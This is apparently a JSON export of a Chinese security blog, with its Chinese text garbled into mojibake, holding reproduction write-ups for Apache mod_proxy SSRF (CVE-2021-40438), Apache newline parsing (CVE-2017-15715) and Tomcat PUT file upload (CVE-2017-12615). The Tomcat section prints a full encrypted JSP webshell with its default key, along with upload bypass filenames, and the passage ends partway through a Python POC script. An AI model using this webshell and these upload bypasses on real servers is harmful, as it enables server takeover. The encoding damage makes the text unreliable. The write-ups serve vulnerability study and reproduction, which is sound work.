(CVE-2021-40438)/image-20230916161434812.png) ä¸Šé¢è¿™ä¸ªæ˜¯vpsæ–°å»ºçš„1.txt Apacheå®˜æ–¹å¯¹è¿™ä¸ªæ¼æ´çš„ä¿®å¤ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå› ä¸ºç”¨æˆ·åªèƒ½æ§åˆ¶r-&gt;filenameçš„ååŠéƒ¨åˆ†ï¼Œè€Œå‰åŠéƒ¨åˆ†proxy:{scheme}://{host}{sport}/æ¥è‡ªäºé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥æœ€æ–°ç‰ˆæ”¹æˆæ£€æŸ¥å…¶å¼€å¤´æ˜¯ä¸æ˜¯proxy:unix:ï¼Œè¿™ä¸€éƒ¨åˆ†ç”¨æˆ·æ— æ³•æ§åˆ¶ã€‚ 0x05 mod_proxy_fcgiæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Ÿ æˆ‘ä»¬å‰æ–‡éƒ½ä»¥mod_proxy_httpä½œä¸ºä¾‹å­æ¥ç ”ç©¶ï¼Œè€Œåœ¨Apache+PHPç¯å¢ƒä¸‹ï¼Œmod_proxy_fcgiçš„ä½¿ç”¨é¢‘ç‡æ›´é«˜ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦ä¹Ÿä¼šè¢«SSRFæ¼æ´å½±å“å‘¢ï¼Ÿ è¿™ä¸ªæ¼æ´å‡ºç°åœ¨modules/proxy/proxy_util.cçš„fix_uds_filenameå‡½æ•°ï¼Œç†è®ºä¸Šæ˜¯mod_proxyçš„æ¼æ´ï¼Œé‚£ä¹ˆå®ƒçš„å­æ¨¡å—åº”è¯¥éƒ½ä¼šè¢«å½±å“ï¼Œä½†è¿™ä¸ªæ¼æ´ä¸­æœ‰ä¸€ä¸ªå¾ˆå…³é”®çš„å˜é‡æ˜¯r-&gt;filenameï¼Œä»–æ˜¯å¦å¯æ§å†³å®šäº†åé¢çš„åˆ©ç”¨æ˜¯å¦å¯ä»¥æˆåŠŸã€‚ æˆ‘ä»¬çœ‹ä¸€ä¸‹mod_proxy_fcgiçš„canonå‡½æ•°ï¼š static int proxy_fcgi_canon(request_rec *r, char *url) { char *host, sport[7]; const char *err; char *path; apr_port_t port, def_port; fcgi_req_config_t *rconf = NULL; const char *pathinfo_type = NULL; if (ap_cstr_casecmpn(url, \"fcgi:\", 5) == 0) { url += 5; } else { return DECLINED; } // ... if (apr_table_get(r-&gt;notes, \"proxy-nocanon\")) { path = url; /* this is the raw path */ } else { path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url), enc_path, 0, r-&gt;proxyreq); } if (path == NULL) return HTTP_BAD_REQUEST; r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:fcgi://\", host, sport, \"/\", path, NULL); // ... } å¯è§ï¼Œè¿™é‡Œçš„r-&gt;filenameç­‰äºproxy:fcgi://{host}{sport}/{path}ï¼Œç›¸æ¯”äºmod_proxy_httpå°‘äº†searchã€‚ä¸è¿‡ï¼Œpathä»ç„¶æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å‘é€è¿™æ ·çš„æ•°æ®åŒ…ï¼š GET /unix:testtest|http://example.com/1.php HTTP/1.1 ... ç»è¿‡è°ƒè¯•å¯è§ï¼Œpathä¸­çš„|è¢«ap_proxy_canonencå‡½æ•°ç¼–ç æˆäº†%7Cï¼š ![image-20230916160430616](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160430616.png) æ²¡æœ‰|ï¼Œåé¢ä¹Ÿå°±æ— æ³•å®ŒæˆSSRFåˆ©ç”¨äº†ã€‚ 0x06 å“ªäº›æ¨¡å—å—åˆ°å½±å“ é‚£ä¹ˆï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥è®¤ä¸ºï¼Œå¦‚æœr-&gt;filenameæœ‰éƒ¨åˆ†å¯æ§ï¼Œä¸”å¯æ§çš„éƒ¨åˆ†æ²¡æœ‰è¢«ç¼–ç ï¼ˆä¸æ˜¯pathï¼‰ï¼Œè¿™ä¸ªæ¨¡å—å°±ä¼šå—åˆ°SSRFæ¼æ´çš„å½±å“ã€‚ å¯¹è¿™ä¸ªç»“è®ºæˆ‘æ²¡æœ‰é€ä¸€æµ‹è¯•è€ƒè¯ï¼Œæˆ‘ä»…æŒ‘é€‰å¦ä¸€ä¸ªè¾ƒä¸ºå¸¸ç”¨çš„æ¨¡å—mod_proxy_ajpæ¥å¤ç°æ¼æ´ã€‚ mod_proxy_ajpæ˜¯ç”¨äºåä»£Tomcatçš„ä¸€ä¸ªApacheæ¨¡å—ï¼ŒTomcatåœ¨8.5.51ç‰ˆæœ¬ä»¥å‰é»˜è®¤ä¼šå¼€å¯ä¸¤ä¸ªç«¯å£8080å’Œ8009ï¼Œåˆ†åˆ«å¯¹åº”HTTPåè®®å’ŒAJPåè®®ã€‚HTTPåè®®å¥½ç†è§£ï¼ŒAJPåè®®æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶åè®®ï¼Œé€šä¿¡åè®®ç›¸æ¯”èµ·æ¥æ•ˆç‡æ›´é«˜ã€‚æ‰€ä»¥ä»¥å‰å¾ˆå¤šè¿ç»´äººå‘˜ä¼šå°†Tomcatæ¶è®¾åœ¨Apacheä¹‹åï¼Œç„¶åäºŒè€…ä¹‹é—´ä½¿ç”¨AJPåè®®é€šä¿¡ã€‚ Tomcat 8.5.51ä¹‹åçš„ç‰ˆæœ¬å—åˆ°Ghostcatæ¼æ´å½±å“ä¸å†é»˜è®¤å¼€æ”¾8009ç«¯å£ã€‚ Apacheä¸‹æœ‰ä¸¤ä¸ªæ¨¡å—èƒ½å®ç°AJPçš„åä»£é€šä¿¡ï¼š mod_proxy_ajp è¿™å°±æ˜¯mod_proxyçš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”±Apache HTTPdå®˜æ–¹ç»´æŠ¤ mod_jk è¿™æ˜¯Tomcatå®˜æ–¹ç»´æŠ¤çš„ä¸€ä¸ªApacheæ¨¡å—ï¼Œæ›´åŠ å‡ºåç”¨æˆ·ä¹Ÿæ›´å¤š ç”±äºmod_jkä¸æ˜¯ç”¨mod_proxyçš„ä»£ç ï¼Œæ‰€ä»¥ä¸å—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä»Šå¤©ä»…æµ‹è¯•mod_proxy_ajpã€‚ ç®€å•éƒ¨ç½²ä¸€ä¸ªå¼€æ”¾8009ç«¯å£çš„TomcatæœåŠ¡å™¨ï¼Œå¹¶é…ç½®å¥½mod_proxy_ajpè¿›è¡Œè°ƒè¯•ï¼Œå¯è§å…¶proxy_ajp_canonå‡½æ•°r-&gt;filenameä¸­æ˜¯åŒ…å«searchçš„ï¼š static int proxy_ajp_canon(request_rec *r, char *url) { char *host, *path, sport[7]; char *search = NULL; const char *err; apr_port_t port, def_port; /* ap_port_of_scheme() */ if (strncasecmp(url, \"ajp:\", 4) == 0) { url += 4; } else { return DECLINED; } // ... r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:ajp://\", host, sport, \"/\", path, (search) ? \"?\" : \"\", (search) ? search : \"\", NULL); return OK; } é‚£ä¹ˆæŒ‰ç…§æˆ‘ä»¬çš„é¢„æµ‹ï¼Œè¿™é‡Œä¹Ÿä¼šå­˜åœ¨SSRFæ¼æ´ã€‚æœç„¶æµ‹è¯•æˆåŠŸï¼š ![image-20230916160702168](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160702168.png) é‚£ä¹ˆï¼Œmod_proxy_http2ã€mod_proxy_balancerã€mod_proxy_wstunnelç­‰è¿™äº›æ¨¡å—ä¹Ÿä¼šå—åˆ°å½±å“ï¼Œè€Œmod_proxy_uwsgiã€mod_proxy_scgiç­‰æ¨¡å—ä¸å—å½±å“ã€‚æˆ‘æ²¡æœ‰ä¸¥æ ¼éªŒè¯ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±ä¸‹å»è°ƒè¯•ä¸€ä¸‹ï¼Œä¹Ÿè®¸è¿˜èƒ½æ‰¾åˆ°ç»•è¿‡æ–¹æ³•ã€‚ 0x07 å‡ ä¸ªå¸¸è§é—®é¢˜å’Œæ€»ç»“ â€‹ ä¸€ä¸ªå¤§å®¶é—®çš„æ¯”è¾ƒå¤šçš„é—®é¢˜ï¼šè¿™ä¸ªSSRFæ¼æ´æ˜¯å¦èƒ½å¤ŸPOSTï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œç†è§£äº†åŸç†çš„åŒå­¦è‚¯å®šèƒ½æ˜ç™½ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯æ§åˆ¶äº†åå‘ä»£ç†çš„ç›®æ ‡æœåŠ¡å™¨åœ°å€ã€‚æ—¢ç„¶æ˜¯åå‘ä»£ç†ï¼Œé‚£ä¹ˆå®é™…ä¸Šç”¨æˆ·è¯·æ±‚çš„å¤§éƒ¨åˆ†åŸå§‹æ•°æ®éƒ½ä¼šè¢«ç›´æ¥è½¬å‘ç»™åç«¯ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦å‘é€POSTè¯·æ±‚ï¼Œå³å¯è®©æ‰§è¡ŒPOSTçš„SSRFï¼Œæ¯”å¦‚ï¼š ![image-20230916160751658](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160751658.png) å¦ä¸€ä¸ªï¼Œè¿™ä¸ªSSRFæ¼æ´æ˜¯å¦å¯ä»¥æ‰“æœ¬åœ°çš„unix socketï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚åŸæœ¬è¿™ä¸ªæ¼æ´çš„ç¬¬ä¸€è¯·æ±‚ç›®æ ‡å°±æ˜¯æœ¬åœ°çš„unixå¥—æ¥å­—ï¼Œæˆ‘ä»¬ä½¿ç”¨4092ä¸ªè¶…é•¿searchç»•è¿‡äº†è¿™ä¸ªé™åˆ¶è®©ä»–å¯ä»¥æ‰“ä»»æ„è¿œç¨‹åœ°å€ï¼Œåªè¦è®©å®ƒå›å½’åŸæœ¬çš„æ–¹æ³•å°±å¯ä»¥æ‰“æœ¬åœ°çš„unixå¥—æ¥å­—äº†ï¼š ![image-20230916160834660](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160834660.png) æ‰“æœ¬åœ°unixå¥—æ¥å­—çš„å¥½å¤„æ˜¯å¯ä»¥æ”»å‡»ç±»ä¼¼äºDockerã€Supervisorè¿™æ ·çš„æœ¬åœ°æœåŠ¡ã€‚ æœ€åä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªSSRFæ¼æ´æ˜¯å¦å¯ä»¥æ”»å‡»ä¸€äº›éHTTPåè®®çš„æœåŠ¡ï¼Ÿç­”æ¡ˆä¹Ÿæ˜¯è‚¯å®šçš„ã€‚TCPæ˜¯ä¸€ä¸ªæ•°æ®æµï¼Œå³ä½¿æˆ‘ä»¬æ‰“å‡ºçš„æ•°æ®åŒ…å‰é¢æœ‰HTTPå¤´ï¼Œè¿™å¹¶ä¸å½±å“åç»­æ­£å¸¸çš„æ»¡è¶³äºŒè¿›åˆ¶åè®®çš„æ•°æ®æµçš„å‘é€ä¸æ¥æ”¶ã€‚ä¸è¿‡æœ‰ä¸€ä¸ªä¾‹å¤–æƒ…å†µï¼Œå¦‚æœç›®æ ‡æœåŠ¡æœ‰ä¸€äº›ç‰¹æ®Šçš„æ“ä½œï¼Œç±»ä¼¼äºé«˜ç‰ˆæœ¬redisè¯»å–åˆ°ä¸€äº›ç‰¹æ®Šçš„HTTPæ•°æ®æ®µå°±æ–­å¼€TCPè¿æ¥è¿™æ ·çš„æ“ä½œï¼Œé‚£ä¹ˆå¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›é¢å¤–ç»•è¿‡äº†ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œè¿™ä¸ªSSRFæ¼æ´çš„æœ¬è´¨æ˜¯Apacheåœ¨è§£æåä»£æœåŠ¡URLçš„æ—¶å€™ï¼Œç”±äºå¯¹unix:ä½ç½®è¦æ±‚ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´ç”¨æˆ·çš„è¾“å…¥å¯ä»¥æ§åˆ¶åä»£çš„é€»è¾‘ï¼Œæœ€ç»ˆå¯¼è‡´åä»£URLè¢«æ§åˆ¶ï¼Œé€ æˆSSRFæ¼æ´ã€‚ CVE-2021-40438 æ¼æ´ä¸º Apache httpd çš„ SSRF æ¼æ´ï¼Œæ ¸å¿ƒåŸç†æ˜¯ mod_proxy æ¨¡å—ä¸ºäº†æ”¯æŒ UDS (Unix Domain Socket) è½¬å‘è€Œäº§ç”Ÿäº†å®‰å…¨æ€§é—®é¢˜ï¼Œå¹¶ç”±å¤šä¸ªä½ç½®ä»£ç é—®é¢˜ç»„åˆäº§ç”Ÿã€‚é€šè¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥ï¼Œæ¼æ´è§¦å‘çš„å‰æå¦‚ä¸‹ï¼š 1.éœ€å¼€å¯ mod_proxy é…ç½® 2.éœ€å·²çŸ¥ `VirtualHost` ä¸­ `ProxyPass` æŒ‡å®šçš„ URL é¡¹ 3.ä½¿ç”¨ GET è¯·æ±‚è¶…é•¿å­—ç¬¦ä¸²ä¸”è¶…è¿‡ç›®æ ‡ Apache è®¾ç½® 4.windows ç‰ˆæœ¬æ¼æ´ä¾ç„¶å­˜åœ¨ è¿™é‡Œä¸çŸ¥ä¸ºä½•ä¸èƒ½è®¿é—®ç™¾åº¦ï¼ˆæ–°æ‰‹åˆ«å–·â”­â”®ï¹â”­â”®ï¼‰æˆ–è®¸æ˜¯ç™¾åº¦åšäº†é˜²æŠ¤æˆ–è€…æ˜¯ç™¾åº¦åè®®ä¸ºhttpsçš„ç¼˜æ•…ï¼Œäº¦æˆ–è€…æŸç§åŸå› å§ï¼Œå¯èƒ½æ˜¯æˆ‘æµ…è–„äº†ã€‚ã€‚ã€‚ 0x08 å‚è€ƒæ–‡ç«  CVE-2021-40438 Apache mod_proxy SSRF æ¼æ´åˆ†æ Apache mod_proxy SSRFï¼ˆCVE-2021-40438ï¼‰çš„ä¸€ç‚¹åˆ†æå’Œå»¶ä¼¸","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰","path":"/2023/09/16/apache-httpd-huan-xing-jie-xi-lou-dong-cve-2017-15715/","content":"0x01 æ¼æ´æè¿° Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_PHPæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œshell.PHP\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ 0x02 å½±å“ç‰ˆæœ¬ Apache HTTPD 2.4.0~2.4.29 0x03 æ¼æ´åˆ†æ æ­¤æ¼æ´çš„å‡ºç°æ˜¯ç”±äº apache åœ¨ä¿®å¤ç¬¬ä¸€ä¸ªåç¼€åè§£ææ¼æ´æ—¶ï¼Œç”¨æ­£åˆ™æ¥åŒ¹é…åç¼€ã€‚åœ¨è§£æ php æ—¶ xxx.php\\x0A å°†è¢«æŒ‰ç…§ php åç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ index.phpæºç ï¼š &lt;?php if(isset($_FILES['file'])) { $name = basename($_POST['name']); //ç›¸å½“äº/var/www/html/1.phpåœ¨basenameå‡½æ•°ä¸‹åªè¿”å›1.php $ext = pathinfo($name,PATHINFO_EXTENSION); //å–ä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼Œä¾‹å¦‚ä¸Šé¢çš„php if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) { exit('bad file');//è®¾ç½®é»‘åå• } move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);//å°†æ–‡ä»¶ä¿å­˜åˆ°æŸä¸ªè·¯å¾„ä¸‹ï¼Œå¹¶é‡æ–°å‘½å } else { ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;p&gt; &lt;label&gt;file:&lt;input type=\"file\" name=\"file\"&gt;&lt;/label&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt;filename:&lt;input type=\"text\" name=\"name\" value=\"evil.php\"&gt;&lt;/label&gt; &lt;/p&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php } ?&gt; ä»¥POSTè¯·æ±‚æ–¹å¼ä¼ å…¥å‚æ•°nameï¼Œå¹¶é€šè¿‡è®¾ç½®é»‘åå•æ¥è¿‡æ»¤åç¼€ã€‚ é…ç½®æ–‡ä»¶ï¼š #cat /etc/apache2/conf-available/docker-php.conf &lt;FilesMatch \\.php$&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; DirectoryIndex disabled DirectoryIndex index.php index.html &lt;Directory /var/www/&gt; Options -Indexes AllowOverride All &lt;/Directory&gt; â€‹ å‰ä¸‰è¡Œçš„å†…å®¹æ„æ€æ˜¯å°†æ‰€æœ‰ä»¥â€œ.phpâ€ä¸ºåç¼€çš„æ–‡ä»¶å†…å®¹å½“ä½œPHPä»£ç è¿›è¡Œè§£æï¼Œä½†æ˜¯å´ä½¿ç”¨äº†â€œ$â€è¿›è¡Œæ–‡ä»¶åŒ¹é…ï¼Œè¿™å°±å¯¼è‡´äº†æ¼æ´çš„äº§ç”Ÿã€‚ï¼ˆå¾ˆæ˜æ˜¾å¦‚æœæ²¡æœ‰åé¢çš„$ï¼Œé‚£æˆ‘ä»¬æ ¹æœ¬ ä¸å¯èƒ½ä¸Šä¼ .phpæ–‡ä»¶è®©å…¶ä»¥phpä»£ç è§£æï¼‰ â€‹ ä½†æ˜¯ä¸å·§çš„æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªä¸œè¥¿å°±æ˜¯$è¿™ä¸ªä¸œè¥¿ï¼Œå®ƒæ˜¯ç”¨æ¥åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®çš„ï¼Œè€Œä¸”å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡(æ­£åˆ™è¡¨è¾¾å¼)çš„ Multiline(/m) å±æ€§ï¼Œåˆ™ $ ä¹ŸåŒ¹é… â€˜ â€™ æˆ– â€˜\\râ€™ã€‚ â€‹ æ‰€ä»¥å¦‚æœæˆ‘ä»¬è®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§(\\m)çš„æ¡ä»¶ä¸‹ï¼Œ$è¿˜ä¼šåŒ¹é…åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ¢è¡Œç¬¦ï¼ˆä¹Ÿå°±æ˜¯%0a),äºæ˜¯ä¹Ÿå°±äº§ç”Ÿäº†è¿™ä¹ˆä¸€ä¸ªæ¢è¡Œè§£ææ¼æ´ 0x04 æ¼æ´å¤ç° è®¿é—®http://ip:8080ï¼Œæ˜¾ç¤ºå¦‚ä¸‹é¡µé¢ï¼š ![image-20230916145037717](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916145037717.png) ç®€å•çš„ä¸Šä¼ ç•Œé¢ï¼Œæˆ‘ä»¬å…ˆéšä¾¿ä¸Šä¼ æµ‹è¯•ä¸€ä¸‹ ![image-20230916145100933](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916145100933.png) å¯ä»¥çœ‹åˆ°evil.phpè¢«æ‹¦æˆªäº†ï¼Œæˆ‘ä»¬bpæŠ“åŒ…åœ¨åé¢æ·»åŠ æ¢è¡Œç¬¦çœ‹çœ‹ â€‹ è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨shell.phpæ–‡ä»¶ååé¢åŠ ä¸Š%0aï¼Œå› ä¸ºGetä¼ å‚ä»–æ˜¯æœ‰URLçš„ç¼–ç è§£ç çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæ˜¯POSTä¼ å‚ï¼Œä»–æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡Hexç¼–ç çš„æ–¹å¼æ‰‹åŠ¨ç»™ä»–åŠ ä¸Š æˆ‘ä»¬å…ˆåŠ ä¸€ä¸ªa(æˆ‘ä»¬éƒ½çŸ¥é“açš„16è¿›åˆ¶ç¼–ç æ˜¯61)ï¼Œç„¶åæˆ‘ä»¬å»æ‰¾åˆ°è¿™ä¸ª61è¿›è¡Œæ›¿æ¢å°±å¥½äº† ![image-20230916145831851](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916145831851.png) æ”¹ä¸º0a ![image-20230916145931567](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916145931567.png) ![image-20230916145941649](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916145941649.png) çœ‹çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºä½•æˆ‘è®¿é—®æ²¡ååº”ï¼Œäºæ˜¯é‡æ–°ä¸Šä¼ äº†ä¸€ä¸‹ï¼Œè¿›å…¥Hexåœ¨evil.phpåç›´æ¥åŠ äº†0aï¼Œä¸Šä¼ åï¼Œè®¿é—®evil.phpæˆåŠŸäº† ![image-20230916150348626](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916150348626.png) æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥ä¹ŸæˆåŠŸ ![image-20230916150502997](Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰/image-20230916150502997.png) 0x05 æ¼æ´ä¿®å¤ 1.å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ 2.å°†ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åä¸ºæ—¶é—´æˆ³+éšæœºæ•°+.jpgçš„æ ¼å¼å¹¶ç¦ç”¨ä¸Šä¼ æ–‡ä»¶ç›®å½•æ‰§è¡Œè„šæœ¬æƒé™ 3.ç¦æ­¢ä¸Šä¼ æ–‡ä»¶æ‰§è¡Œ 0x06 æ€»ç»“ è¿™ä¸ªæ¼æ´éœ€è¦æœ‰ä»¥ä¸‹åˆ©ç”¨æ¡ä»¶ï¼š 1ã€è·å–æ–‡ä»¶åæ—¶ä¸èƒ½ç”¨**$_FILES['file']['name'],å› ä¸ºå®ƒä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰ã€‚ 2ã€Apacheç‰ˆæœ¬ä¸º2.4.0åˆ°2.4.29 3ã€æœåŠ¡å™¨å¿…é¡»æ˜¯**linuxç³»ç»Ÿ**ï¼Œå› ä¸ºwindowsç¯å¢ƒä¸‹ä¸æ”¯æŒåç¼€åå¸¦æœ‰æ¢è¡Œç¬¦\\x0a æ€»ä½“ä¸Šè€Œè¨€ï¼Œåªè¦å–**$FILES[â€˜fileâ€™][â€˜nameâ€™]ä½œä¸ºæ–‡ä»¶åï¼Œå°±å¯ä»¥æ— è§†è¯¥è§£ææ¼æ´ï¼Œæ‰€ä»¥è¯¥æ¼æ´æ€»ä½“æ¥è¯´å®é™…ç”¨å¤„ä¸å¤§ï¼Œä½†æ˜¯ç”±äºæ¼æ´æ ¹æœ¬æˆå› åœ¨äº$ï¼Œåœ¨ä»¥åçš„å…¶ä»–æŸäº›æ¼æ´å¯èƒ½ä¼šæœ‰åˆ©ç”¨åˆ°çš„åœ°æ–¹ï¼Œæ‰€ä»¥è¿™ä¸ªä½œä¸ºä¸€ç§å§¿åŠ¿å­¦ä¹ ä¸€ä¸‹è¿˜æ˜¯å¾ˆæœ‰è¶£çš„ã€‚ 0x07 å‚è€ƒæ–‡ç«  Apache HTTPD æ¢è¡Œè§£ææ¼æ´åˆ†æä¸å¤ç°ï¼ˆCVE-2017-15715ï¼‰ ã€æ¼æ´å¤ç°ã€‘Apache HTTPD æ¢è¡Œè§£ææ¼æ´ (CVE-2017-15715) Apache HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Tomcat-ä»»æ„æ–‡ä»¶å†™å…¥CVE-2017-12615","path":"/2023/09/16/tomcat-ren-yi-wen-jian-xie-ru/","content":"0x01 æ¼æ´æè¿°ï¼š CVE-2017-12615ï¼šè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ å½±å“èŒƒå›´ï¼šApache Tomcat 7.0.0 - 7.0.79 (windowsç¯å¢ƒ) å½“ Tomcat è¿è¡Œåœ¨ Windows æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¸”å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚å¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚ 0x02 å¤ç°è¿‡ç¨‹ï¼š å¼€å¯ç¯å¢ƒåè¿›å…¥é…ç½®æ–‡ä»¶æŸ¥çœ‹ä¸€ä¸‹ #æŸ¥çœ‹é•œåƒ docker ps #è¿›å…¥é•œåƒç¯å¢ƒ docker exec -ti 03de30c386ea bas #æŸ¥çœ‹é…ç½®æ–‡ä»¶conf/web.xmlä¸­readonlyçš„è®¾ç½® cat conf/web.xml | grep readonly æŸ¥çœ‹ç½‘ç«™ http://your-ip:8080/ æ–¹æ³•ä¸€ï¼š ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œä¿®æ”¹GETä¸ºPUTä¸Šä¼ æ–¹å¼ï¼Œæ·»åŠ æ–‡ä»¶å1.jsp/ï¼Œæ·»åŠ shellè„šæœ¬ &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt; æˆåŠŸä¸Šä¼  ä½¿ç”¨å†°èè®¿é—® è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œæˆ‘çš„å†°èæ­»æ´»è¿æ¥ä¸ä¸Š æ–¹æ³•äºŒ(é€‚ç”¨äºWindowsç³»ç»Ÿ) æ·»åŠ æ–‡ä»¶å2.jsp%20ï¼Œæ·»åŠ shellè„šæœ¬ æ–¹æ³•ä¸‰(é€‚ç”¨äºWindowsç³»ç»Ÿ) æ·»åŠ æ–‡ä»¶å3.jsp::$DATAï¼Œæ·»åŠ shellè„šæœ¬ 0x03 POCå’ŒEXPè„šæœ¬ POCä»£ç  #CVE-2017-12615 POC __author__ = 'çº¸æœº' import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args = parse.parse_args() #print(options) #éªŒè¯å‚æ•°æ˜¯å¦å®Œæ•´ if (not options.URL or not options.PORT) and not options.FILE: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE] ') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') filename = '/hello.jsp' #æµ‹è¯•æ•°æ® data = 'hello' #æäº¤PUTè¯·æ±‚ #resp = requests.post(url1,headers=headers,data=data) 